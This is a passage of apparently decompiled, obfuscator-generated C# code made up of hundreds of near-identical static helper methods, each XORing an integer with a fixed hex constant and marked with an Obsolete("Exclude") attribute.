	public static int smethod_1000(int int_4)
	{
		return int_4 ^ 0x58C2AF1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1001(int int_4)
	{
		return int_4 ^ 0x22E2367E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1002(int int_4)
	{
		return int_4 ^ 0x57FA7954;
	}

	[Obsolete("Exclude")]
	public static int smethod_1003(int int_4)
	{
		return int_4 ^ 0x4D5EE87F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1004(int int_4)
	{
		return int_4 ^ 0x432DD40B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1005(int int_4)
	{
		return int_4 ^ 0x5016BFB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1006(int int_4)
	{
		return int_4 ^ 0x31B2C1A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1007(int int_4)
	{
		return int_4 ^ 0x26B8ACDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1008(int int_4)
	{
		return int_4 ^ 0x4AF3D211;
	}

	[Obsolete("Exclude")]
	public static int smethod_1009(int int_4)
	{
		return int_4 ^ 0x1CCB757C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1010(int int_4)
	{
		return int_4 ^ 0x71FCB709;
	}

	[Obsolete("Exclude")]
	public static int smethod_1011(int int_4)
	{
		return int_4 ^ 0x6E574240;
	}

	[Obsolete("Exclude")]
	public static int smethod_1012(int int_4)
	{
		return int_4 ^ 0x1ED8666C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1013(int int_4)
	{
		return int_4 ^ 0x319B823B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1014(int int_4)
	{
		return int_4 ^ 0x26E9F616;
	}

	[Obsolete("Exclude")]
	public static int smethod_1015(int int_4)
	{
		return int_4 ^ 0x56A4EDF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1016(int int_4)
	{
		return int_4 ^ 0x21602327;
	}

	[Obsolete("Exclude")]
	public static int smethod_1017(int int_4)
	{
		return int_4 ^ 0x77530912;
	}

	[Obsolete("Exclude")]
	public static int smethod_1018(int int_4)
	{
		return int_4 ^ 0x5DC8BF19;
	}

	[Obsolete("Exclude")]
	public static int smethod_1019(int int_4)
	{
		return int_4 ^ 0x4C83AF7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1020(int int_4)
	{
		return int_4 ^ 0x6BEDEDC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1021(int int_4)
	{
		return int_4 ^ 0x7ACDB0EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1022(int int_4)
	{
		return int_4 ^ 0x13169DAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1023(int int_4)
	{
		return int_4 ^ 0x1ACC7599;
	}

	[Obsolete("Exclude")]
	public static int smethod_1024(int int_4)
	{
		return int_4 ^ 0x10F6C037;
	}

	[Obsolete("Exclude")]
	public static int smethod_1025(int int_4)
	{
		return int_4 ^ 0x59170B8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1026(int int_4)
	{
		return int_4 ^ 0x3D632ECB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1027(int int_4)
	{
		return int_4 ^ 0x60E3814B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1028(int int_4)
	{
		return int_4 ^ 0x473ECE72;
	}

	[Obsolete("Exclude")]
	public static int smethod_1029(int int_4)
	{
		return int_4 ^ 0x524DD80;
	}

	[Obsolete("Exclude")]
	public static int smethod_1030(int int_4)
	{
		return int_4 ^ 0x7190A419;
	}

	[Obsolete("Exclude")]
	public static int smethod_1031(int int_4)
	{
		return int_4 ^ 0xC907C87;
	}

	[Obsolete("Exclude")]
	public static int smethod_1032(int int_4)
	{
		return int_4 ^ 0x160210E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1033(int int_4)
	{
		return int_4 ^ 0xF54507D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1034(int int_4)
	{
		return int_4 ^ 0x7451DC41;
	}

	[Obsolete("Exclude")]
	public static int smethod_1035(int int_4)
	{
		return int_4 ^ 0x4E88F25E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1036(int int_4)
	{
		return int_4 ^ 0x5C3594A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1037(int int_4)
	{
		return int_4 ^ 0x4FBC70A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1038(int int_4)
	{
		return int_4 ^ 0x6405BF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1039(int int_4)
	{
		return int_4 ^ 0x49AB1BA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1040(int int_4)
	{
		return int_4 ^ 0x78864D85;
	}

	[Obsolete("Exclude")]
	public static int smethod_1041(int int_4)
	{
		return int_4 ^ 0x7C9DC9C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1042(int int_4)
	{
		return int_4 ^ 0x36EA498A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1043(int int_4)
	{
		return int_4 ^ 0x77BFF69;
	}

	[Obsolete("Exclude")]
	public static int smethod_1044(int int_4)
	{
		return int_4 ^ 0x43134ABF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1045(int int_4)
	{
		return int_4 ^ 0x40BC299F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1046(int int_4)
	{
		return int_4 ^ 0x6EA863A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1047(int int_4)
	{
		return int_4 ^ 0x551EFE3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1048(int int_4)
	{
		return int_4 ^ 0x3E929781;
	}

	[Obsolete("Exclude")]
	public static int smethod_1049(int int_4)
	{
		return int_4 ^ 0x7B4D6EB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1050(int int_4)
	{
		return int_4 ^ 0x5FE6B906;
	}

	[Obsolete("Exclude")]
	public static int smethod_1051(int int_4)
	{
		return int_4 ^ 0x12826B1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1052(int int_4)
	{
		return int_4 ^ 0x65A9DE60;
	}

	[Obsolete("Exclude")]
	public static int smethod_1053(int int_4)
	{
		return int_4 ^ 0x18CAC04;
	}

	[Obsolete("Exclude")]
	public static int smethod_1054(int int_4)
	{
		return int_4 ^ 0x78DFCBA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1055(int int_4)
	{
		return int_4 ^ 0x1E10BB23;
	}

	[Obsolete("Exclude")]
	public static int smethod_1056(int int_4)
	{
		return int_4 ^ 0x6DCFD929;
	}

	[Obsolete("Exclude")]
	public static int smethod_1057(int int_4)
	{
		return int_4 ^ 0x5A9D7A8D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1058(int int_4)
	{
		return int_4 ^ 0x64F30B21;
	}

	[Obsolete("Exclude")]
	public static int smethod_1059(int int_4)
	{
		return int_4 ^ 0x707629AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1060(int int_4)
	{
		return int_4 ^ 0x4030EEC1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1061(int int_4)
	{
		return int_4 ^ 0x644A8792;
	}

	[Obsolete("Exclude")]
	public static int smethod_1062(int int_4)
	{
		return int_4 ^ 0x221BE886;
	}

	[Obsolete("Exclude")]
	public static int smethod_1063(int int_4)
	{
		return int_4 ^ 0x1FD541B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1064(int int_4)
	{
		return int_4 ^ 0x68964ABE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1065(int int_4)
	{
		return int_4 ^ 0x23C8BB5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1066(int int_4)
	{
		return int_4 ^ 0x6028D9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1067(int int_4)
	{
		return int_4 ^ 0x35DE2150;
	}

	[Obsolete("Exclude")]
	public static int smethod_1068(int int_4)
	{
		return int_4 ^ 0x237B586C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1069(int int_4)
	{
		return int_4 ^ 0x677E7644;
	}

	[Obsolete("Exclude")]
	public static int smethod_1070(int int_4)
	{
		return int_4 ^ 0x103E1A8E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1071(int int_4)
	{
		return int_4 ^ 0x269F0A96;
	}

	[Obsolete("Exclude")]
	public static int smethod_1072(int int_4)
	{
		return int_4 ^ 0x6F0CA7CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1073(int int_4)
	{
		return int_4 ^ 0x32ED9FF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1074(int int_4)
	{
		return int_4 ^ 0x2E5C8C7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1075(int int_4)
	{
		return int_4 ^ 0x145FAC94;
	}

	[Obsolete("Exclude")]
	public static int smethod_1076(int int_4)
	{
		return int_4 ^ 0x38F6C3D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1077(int int_4)
	{
		return int_4 ^ 0x45837373;
	}

	[Obsolete("Exclude")]
	public static int smethod_1078(int int_4)
	{
		return int_4 ^ 0x1EF6AB83;
	}

	[Obsolete("Exclude")]
	public static int smethod_1079(int int_4)
	{
		return int_4 ^ 0x91E7251;
	}

	[Obsolete("Exclude")]
	public static int smethod_1080(int int_4)
	{
		return int_4 ^ 0x3DF4112D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1081(int int_4)
	{
		return int_4 ^ 0x711CE912;
	}

	[Obsolete("Exclude")]
	public static int smethod_1082(int int_4)
	{
		return int_4 ^ 0x713871FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1083(int int_4)
	{
		return int_4 ^ 0x6FB3550B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1084(int int_4)
	{
		return int_4 ^ 0x78A99A86;
	}

	[Obsolete("Exclude")]
	public static int smethod_1085(int int_4)
	{
		return int_4 ^ 0x78DF257B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1086(int int_4)
	{
		return int_4 ^ 0x2605D50E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1087(int int_4)
	{
		return int_4 ^ 0xB980F3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1088(int int_4)
	{
		return int_4 ^ 0x54CC9ECC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1089(int int_4)
	{
		return int_4 ^ 0x78CB8613;
	}

	[Obsolete("Exclude")]
	public static int smethod_1090(int int_4)
	{
		return int_4 ^ 0x7F1D6521;
	}

	[Obsolete("Exclude")]
	public static int smethod_1091(int int_4)
	{
		return int_4 ^ 0x36F37587;
	}

	[Obsolete("Exclude")]
	public static int smethod_1092(int int_4)
	{
		return int_4 ^ 0x43928E0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1093(int int_4)
	{
		return int_4 ^ 0x1333EDBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1094(int int_4)
	{
		return int_4 ^ 0x6C1E16D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1095(int int_4)
	{
		return int_4 ^ 0x37F4B900;
	}

	[Obsolete("Exclude")]
	public static int smethod_1096(int int_4)
	{
		return int_4 ^ 0x17930B5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1097(int int_4)
	{
		return int_4 ^ 0x60187E2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1098(int int_4)
	{
		return int_4 ^ 0x4866BA11;
	}

	[Obsolete("Exclude")]
	public static int smethod_1099(int int_4)
	{
		return int_4 ^ 0x57C757D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1100(int int_4)
	{
		return int_4 ^ 0x54CDBE9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1101(int int_4)
	{
		return int_4 ^ 0x327598B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1102(int int_4)
	{
		return int_4 ^ 0x606C73C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1103(int int_4)
	{
		return int_4 ^ 0x46FBADE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1104(int int_4)
	{
		return int_4 ^ 0x28DAA678;
	}

	[Obsolete("Exclude")]
	public static int smethod_1105(int int_4)
	{
		return int_4 ^ 0x2C0DA2F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1106(int int_4)
	{
		return int_4 ^ 0x5C7CFD02;
	}

	[Obsolete("Exclude")]
	public static int smethod_1107(int int_4)
	{
		return int_4 ^ 0x466D86D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1108(int int_4)
	{
		return int_4 ^ 0x602F730A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1109(int int_4)
	{
		return int_4 ^ 0x9183F6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1110(int int_4)
	{
		return int_4 ^ 0x48869614;
	}

	[Obsolete("Exclude")]
	public static int smethod_1111(int int_4)
	{
		return int_4 ^ 0x1ABC65EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1112(int int_4)
	{
		return int_4 ^ 0x1953D125;
	}

	[Obsolete("Exclude")]
	public static int smethod_1113(int int_4)
	{
		return int_4 ^ 0x36B71E50;
	}

	[Obsolete("Exclude")]
	public static int smethod_1114(int int_4)
	{
		return int_4 ^ 0xE189F2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1115(int int_4)
	{
		return int_4 ^ 0x232E41D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1116(int int_4)
	{
		return int_4 ^ 0x47630310;
	}

	[Obsolete("Exclude")]
	public static int smethod_1117(int int_4)
	{
		return int_4 ^ 0x49C2142A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1118(int int_4)
	{
		return int_4 ^ 0x4AEF10A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1119(int int_4)
	{
		return int_4 ^ 0x40956ADC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1120(int int_4)
	{
		return int_4 ^ 0x48098699;
	}

	[Obsolete("Exclude")]
	public static int smethod_1121(int int_4)
	{
		return int_4 ^ 0x24C25087;
	}

	[Obsolete("Exclude")]
	public static int smethod_1122(int int_4)
	{
		return int_4 ^ 0x2C18699D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1123(int int_4)
	{
		return int_4 ^ 0x6B662BAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1124(int int_4)
	{
		return int_4 ^ 0x181A6DBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1125(int int_4)
	{
		return int_4 ^ 0x62BD65E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1126(int int_4)
	{
		return int_4 ^ 0x3548990D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1127(int int_4)
	{
		return int_4 ^ 0xD74E777;
	}

	[Obsolete("Exclude")]
	public static int smethod_1128(int int_4)
	{
		return int_4 ^ 0x1CBA07AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1129(int int_4)
	{
		return int_4 ^ 0x717AA600;
	}

	[Obsolete("Exclude")]
	public static int smethod_1130(int int_4)
	{
		return int_4 ^ 0x6B07CE46;
	}

	[Obsolete("Exclude")]
	public static int smethod_1131(int int_4)
	{
		return int_4 ^ 0x19A186D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1132(int int_4)
	{
		return int_4 ^ 0x6D5183EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1133(int int_4)
	{
		return int_4 ^ 0x4FE44746;
	}

	[Obsolete("Exclude")]
	public static int smethod_1134(int int_4)
	{
		return int_4 ^ 0x72D0A2FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1135(int int_4)
	{
		return int_4 ^ 0x5D9120F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1136(int int_4)
	{
		return int_4 ^ 0x115CBB7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1137(int int_4)
	{
		return int_4 ^ 0x114A7A24;
	}

	[Obsolete("Exclude")]
	public static int smethod_1138(int int_4)
	{
		return int_4 ^ 0x41B2021;
	}

	[Obsolete("Exclude")]
	public static int smethod_1139(int int_4)
	{
		return int_4 ^ 0x46C3634;
	}

	[Obsolete("Exclude")]
	public static int smethod_1140(int int_4)
	{
		return int_4 ^ 0x361047D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1141(int int_4)
	{
		return int_4 ^ 0x60DF03A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1142(int int_4)
	{
		return int_4 ^ 0x4F373E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1143(int int_4)
	{
		return int_4 ^ 0x4B945280;
	}

	[Obsolete("Exclude")]
	public static int smethod_1144(int int_4)
	{
		return int_4 ^ 0x6E73EF2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1145(int int_4)
	{
		return int_4 ^ 0x2B3E2B55;
	}

	[Obsolete("Exclude")]
	public static int smethod_1146(int int_4)
	{
		return int_4 ^ 0x601E0295;
	}

	[Obsolete("Exclude")]
	public static int smethod_1147(int int_4)
	{
		return int_4 ^ 0x1BE94AFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1148(int int_4)
	{
		return int_4 ^ 0x61DEBEB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1149(int int_4)
	{
		return int_4 ^ 0x455D7902;
	}

	[Obsolete("Exclude")]
	public static int smethod_1150(int int_4)
	{
		return int_4 ^ 0x52C6D182;
	}

	[Obsolete("Exclude")]
	public static int smethod_1151(int int_4)
	{
		return int_4 ^ 0xEA02D69;
	}

	[Obsolete("Exclude")]
	public static int smethod_1152(int int_4)
	{
		return int_4 ^ 0x1BD62CE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1153(int int_4)
	{
		return int_4 ^ 0x96485F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1154(int int_4)
	{
		return int_4 ^ 0x7E25F4C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1155(int int_4)
	{
		return int_4 ^ 0x17B4B537;
	}

	[Obsolete("Exclude")]
	public static int smethod_1156(int int_4)
	{
		return int_4 ^ 0x4D2B26EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1157(int int_4)
	{
		return int_4 ^ 0x1B11E248;
	}

	[Obsolete("Exclude")]
	public static int smethod_1158(int int_4)
	{
		return int_4 ^ 0x50A4489E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1159(int int_4)
	{
		return int_4 ^ 0x3097D2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1160(int int_4)
	{
		return int_4 ^ 0x3FCFC048;
	}

	[Obsolete("Exclude")]
	public static int smethod_1161(int int_4)
	{
		return int_4 ^ 0x5FE4E3E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1162(int int_4)
	{
		return int_4 ^ 0x21C02ABC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1163(int int_4)
	{
		return int_4 ^ 0x40210176;
	}

	[Obsolete("Exclude")]
	public static int smethod_1164(int int_4)
	{
		return int_4 ^ 0x59DA42E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1165(int int_4)
	{
		return int_4 ^ 0x21E6A011;
	}

	[Obsolete("Exclude")]
	public static int smethod_1166(int int_4)
	{
		return int_4 ^ 0xEB616D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1167(int int_4)
	{
		return int_4 ^ 0x58DF1B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1168(int int_4)
	{
		return int_4 ^ 0x21DDAA18;
	}

	[Obsolete("Exclude")]
	public static int smethod_1169(int int_4)
	{
		return int_4 ^ 0x9AF2BB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1170(int int_4)
	{
		return int_4 ^ 0x47965A9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1171(int int_4)
	{
		return int_4 ^ 0x8775E0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1172(int int_4)
	{
		return int_4 ^ 0x3CBEDB6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1173(int int_4)
	{
		return int_4 ^ 0x42FD40BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1174(int int_4)
	{
		return int_4 ^ 0x55ED8D42;
	}

	[Obsolete("Exclude")]
	public static int smethod_1175(int int_4)
	{
		return int_4 ^ 0x1FA81340;
	}

	[Obsolete("Exclude")]
	public static int smethod_1176(int int_4)
	{
		return int_4 ^ 0x70DED4F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1177(int int_4)
	{
		return int_4 ^ 0x7938D5AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1178(int int_4)
	{
		return int_4 ^ 0xC8141B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1179(int int_4)
	{
		return int_4 ^ 0x64C095A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1180(int int_4)
	{
		return int_4 ^ 0x5B3416AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1181(int int_4)
	{
		return int_4 ^ 0x61FFB34B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1182(int int_4)
	{
		return int_4 ^ 0x6D86459;
	}

	[Obsolete("Exclude")]
	public static int smethod_1183(int int_4)
	{
		return int_4 ^ 0x55C94DD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1184(int int_4)
	{
		return int_4 ^ 0x988A61D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1185(int int_4)
	{
		return int_4 ^ 0x33DF3DA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1186(int int_4)
	{
		return int_4 ^ 0x38043332;
	}

	[Obsolete("Exclude")]
	public static int smethod_1187(int int_4)
	{
		return int_4 ^ 0x425430F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1188(int int_4)
	{
		return int_4 ^ 0x59FEBD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1189(int int_4)
	{
		return int_4 ^ 0x643D4539;
	}

	[Obsolete("Exclude")]
	public static int smethod_1190(int int_4)
	{
		return int_4 ^ 0x635EEC1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1191(int int_4)
	{
		return int_4 ^ 0x23F5650D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1192(int int_4)
	{
		return int_4 ^ 0x33F01E24;
	}

	[Obsolete("Exclude")]
	public static int smethod_1193(int int_4)
	{
		return int_4 ^ 0x14718FC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1194(int int_4)
	{
		return int_4 ^ 0x13815EF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1195(int int_4)
	{
		return int_4 ^ 0x12DD59C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1196(int int_4)
	{
		return int_4 ^ 0x5A17C4F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1197(int int_4)
	{
		return int_4 ^ 0x1F55FDCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1198(int int_4)
	{
		return int_4 ^ 0x73B435A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1199(int int_4)
	{
		return int_4 ^ 0x30453A05;
	}

	[Obsolete("Exclude")]
	public static int smethod_1200(int int_4)
	{
		return int_4 ^ 0x463E4724;
	}

	[Obsolete("Exclude")]
	public static int smethod_1201(int int_4)
	{
		return int_4 ^ 0x2B54CD59;
	}

	[Obsolete("Exclude")]
	public static int smethod_1202(int int_4)
	{
		return int_4 ^ 0x631C5ADC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1203(int int_4)
	{
		return int_4 ^ 0x622A6BE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1204(int int_4)
	{
		return int_4 ^ 0x7AC480C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1205(int int_4)
	{
		return int_4 ^ 0x6AE310B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1206(int int_4)
	{
		return int_4 ^ 0xE8FA1EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1207(int int_4)
	{
		return int_4 ^ 0x2A11E0CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1208(int int_4)
	{
		return int_4 ^ 0x4B659040;
	}

	[Obsolete("Exclude")]
	public static int smethod_1209(int int_4)
	{
		return int_4 ^ 0x1B800D7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1210(int int_4)
	{
		return int_4 ^ 0x3BCC9547;
	}

	[Obsolete("Exclude")]
	public static int smethod_1211(int int_4)
	{
		return int_4 ^ 0x11EEEEF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1212(int int_4)
	{
		return int_4 ^ 0x3DF82AE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1213(int int_4)
	{
		return int_4 ^ 0x496CEA00;
	}

	[Obsolete("Exclude")]
	public static int smethod_1214(int int_4)
	{
		return int_4 ^ 0x4439E57D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1215(int int_4)
	{
		return int_4 ^ 0x1123D35;
	}

	[Obsolete("Exclude")]
	public static int smethod_1216(int int_4)
	{
		return int_4 ^ 0x98AE1C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1217(int int_4)
	{
		return int_4 ^ 0x79F7F108;
	}

	[Obsolete("Exclude")]
	public static int smethod_1218(int int_4)
	{
		return int_4 ^ 0x13765FCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1219(int int_4)
	{
		return int_4 ^ 0x700BBA15;
	}

	[Obsolete("Exclude")]
	public static int smethod_1220(int int_4)
	{
		return int_4 ^ 0x30DA2F4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1221(int int_4)
	{
		return int_4 ^ 0x632CB645;
	}

	[Obsolete("Exclude")]
	public static int smethod_1222(int int_4)
	{
		return int_4 ^ 0x352A4D61;
	}

	[Obsolete("Exclude")]
	public static int smethod_1223(int int_4)
	{
		return int_4 ^ 0x659DEDCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1224(int int_4)
	{
		return int_4 ^ 0x5C88033B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1225(int int_4)
	{
		return int_4 ^ 0x175FD375;
	}

	[Obsolete("Exclude")]
	public static int smethod_1226(int int_4)
	{
		return int_4 ^ 0xEB22767;
	}

	[Obsolete("Exclude")]
	public static int smethod_1227(int int_4)
	{
		return int_4 ^ 0x137E2FD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1228(int int_4)
	{
		return int_4 ^ 0x7EA25340;
	}

	[Obsolete("Exclude")]
	public static int smethod_1229(int int_4)
	{
		return int_4 ^ 0x20CB121B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1230(int int_4)
	{
		return int_4 ^ 0x223A1657;
	}

	[Obsolete("Exclude")]
	public static int smethod_1231(int int_4)
	{
		return int_4 ^ 0x2377A084;
	}

	[Obsolete("Exclude")]
	public static int smethod_1232(int int_4)
	{
		return int_4 ^ 0x636EEF0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1233(int int_4)
	{
		return int_4 ^ 0x530DE8BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1234(int int_4)
	{
		return int_4 ^ 0x5CD512B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1235(int int_4)
	{
		return int_4 ^ 0x143E1CEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1236(int int_4)
	{
		return int_4 ^ 0x927B911;
	}

	[Obsolete("Exclude")]
	public static int smethod_1237(int int_4)
	{
		return int_4 ^ 0x316F58B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1238(int int_4)
	{
		return int_4 ^ 0x6D559EAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1239(int int_4)
	{
		return int_4 ^ 0x81324BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1240(int int_4)
	{
		return int_4 ^ 0x46D69BD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1241(int int_4)
	{
		return int_4 ^ 0x179BAD8D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1242(int int_4)
	{
		return int_4 ^ 0x6E9452B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1243(int int_4)
	{
		return int_4 ^ 0x4CE50A86;
	}

	[Obsolete("Exclude")]
	public static int smethod_1244(int int_4)
	{
		return int_4 ^ 0x79155EBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1245(int int_4)
	{
		return int_4 ^ 0x7E0D08F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1246(int int_4)
	{
		return int_4 ^ 0x56433C88;
	}

	[Obsolete("Exclude")]
	public static int smethod_1247(int int_4)
	{
		return int_4 ^ 0xBFFF2BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1248(int int_4)
	{
		return int_4 ^ 0x65FA0CDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1249(int int_4)
	{
		return int_4 ^ 0x646EB9F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1250(int int_4)
	{
		return int_4 ^ 0x32CB19F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1251(int int_4)
	{
		return int_4 ^ 0x74C7F68F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1252(int int_4)
	{
		return int_4 ^ 0x63C6FE30;
	}

	[Obsolete("Exclude")]
	public static int smethod_1253(int int_4)
	{
		return int_4 ^ 0xA92411;
	}

	[Obsolete("Exclude")]
	public static int smethod_1254(int int_4)
	{
		return int_4 ^ 0x71AC9417;
	}

	[Obsolete("Exclude")]
	public static int smethod_1255(int int_4)
	{
		return int_4 ^ 0x1478B30;
	}

	[Obsolete("Exclude")]
	public static int smethod_1256(int int_4)
	{
		return int_4 ^ 0x384DA15F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1257(int int_4)
	{
		return int_4 ^ 0x742E2954;
	}

	[Obsolete("Exclude")]
	public static int smethod_1258(int int_4)
	{
		return int_4 ^ 0x6C44D9F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1259(int int_4)
	{
		return int_4 ^ 0x42EB7E19;
	}

	[Obsolete("Exclude")]
	public static int smethod_1260(int int_4)
	{
		return int_4 ^ 0x2D6DEDBF;
	}

	[Obsolete("Exclude")]
